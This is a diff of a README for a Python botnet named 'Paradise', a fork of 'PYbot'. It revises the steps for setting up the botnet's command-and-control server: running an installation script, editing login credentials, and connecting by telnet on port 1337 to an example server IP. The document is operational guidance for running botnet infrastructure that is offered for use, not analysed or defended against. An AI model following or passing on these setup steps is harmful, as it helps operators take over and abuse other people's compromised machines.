@@ -3,14 +3,12 @@ A python botnet forked from "PYbot" which was discontinued, a completely remade 
 
 # Requirements
   <li>A VPS Server</li>
-  <li>Any Linux Distro that has a command line</li>
+  <li>Any Linux Distro</li>
 
 # How to Setup
-  <pre><code>sudo apt install python2 python3
-pip3 install colorama
-cd Paradise
-python3 cnc.py 1337</code></pre>
-  <li>Use telnet with the ip of your server and port 23</li>  
+  <p>Make sure you change the username and password in the <code>logins.txt</code> file.</p>
+  <pre><code>sudo bash installation.sh</code></pre>
+  <li>Use telnet with the ip of your server and port 1337 (Or any other port)</li>  
   Example: <pre><code>telnet 198.245.61.217 1337</code></pre></li>
 
 # How to Setup Bots
